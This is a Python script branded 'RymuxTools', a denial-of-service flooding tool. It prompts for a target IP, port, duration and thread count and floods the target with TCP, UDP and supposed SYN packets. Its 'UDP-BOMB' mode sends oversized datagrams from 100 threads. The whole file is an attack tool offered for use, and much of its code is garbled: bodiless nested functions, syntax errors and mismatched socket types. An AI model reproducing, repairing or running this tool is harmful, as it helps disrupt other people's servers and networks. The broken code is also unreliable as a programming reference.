#RymuxTools
import socket
import os
import random
import sys
import struct
import threading
from time import time as tt

os.system('cls' if os.name == 'nt' else 'clear')

logo = """
\031[91m██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗
\033[91m██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝
\036[91m██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░
\034[91m██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░
\035[91m██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██
\037[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝
"""

banner = """
\033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
\033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
\033[91m|-----------------------|
\033[91m|   TCP    | 80  | 3389 |
\033[91m|   SYN    | 80  | 3389 |
\033[91m|   UDP    |17091| 7777 |
\033[91m| UDP-BOMB |17091| 7777 |
\033[91m] TCP-BOMBA| 80  | 3389 |
\033[91m|----------|------------|
"""

print(logo)
print(banner)
method = str(input("Method (TCP, UDP, SYN, UDP) : "))

def UDP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    data = random._urandom(666)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)

def TCP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    data = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)
        
 def TCP_BOMBA():
 
 def randproxy():
     ip = ".".join(map(str, (random.randint(o,255)for _ in range(4)))
  def randport():
      port = random.randint(1000.9000)
      return port
      
     ip = str(input("IP : ")))
     port = int(input("PORT : "))
     time = int(input("TIME : "))
     
  def ddos():
      while True:
           data = random._urandom(2048)
           s = socket.socket(socket.AF_INET, socket .SOCK_STREAM)
           s = setsock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY 1)
           try:
             s.send(randproxy)
             s.send(randport)
             print(print(f"[{i}]" + "TCP-BOMBA METHOD LAUNCHED TO >" format.ip))
             except :
               print(print(f"{i}" + "TCP-BOMBA DIDN'T SENDING PACKETS DUE TO WRONG INPUT >" format.ip))
               
              finally:
                sock.close
     
  def SYN
      
def randproxy():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randport():
    port = random.randint(1000,9000)
    return port

ip = str(input("\nenter ip target > "))
port = int(input("port address > "))
times = int(input("times ? > "))
threads = int(input("how many threads you want ? > "))

def ddos():
     while True:
          o = ["!", "+", "=", "-", "/"]
          i = random.choice(o)
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((ip, port))
          try:
               s.send(randproxy)
               s.send(randport)
               print(f"[{i}]" + "SYN-METHOD LAUNCHED FOR {}".format(ip))
          except ConnectionAbortedError:
               s.close()
               print(print(f"[{i}]" + "SYN-METHOD LAUNCHED FOR {} > DOWN".format(ip)))

if __name__ == "__main__":
     th = threading.Thread(target=ddos)
     th.start()
   
  def UDP_BOMB():
    
print("""
UDP Bomber Tools 
""")

ip = str(input("IP : "))
port = int(input("Port : "))
time = int(input("Time : "))

hh == random._urandom(2048)
xx == int (0)

def attack():
    data = bytearray(56656)
    data[0] = 0x1B
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    addr = (str(ip),int(port),int(time))
    while True:
        s.sendto(data, (ip,port))

for _ in range(100):
    t = threading.Thread(target=attack)
    t.start()
 
if __name__ == '__main__':
	print(logo)
	print(banner)
	try:
		if method == 'TCP':
			TCP()
	  elif method == 'SYN':
	    SYN()
		elif method == 'UDP':
			UDP()
		elif method == 'UDP_BOMB':
		  UDP_BOMB()
		elif method === 'TCP-BOMBA':
		  TCP-BOMBA
		  
		else:
			print("Unknow method: %s" % method)
	except KeyboardInterrupt:
		print("\033[32mAttack stopped.")
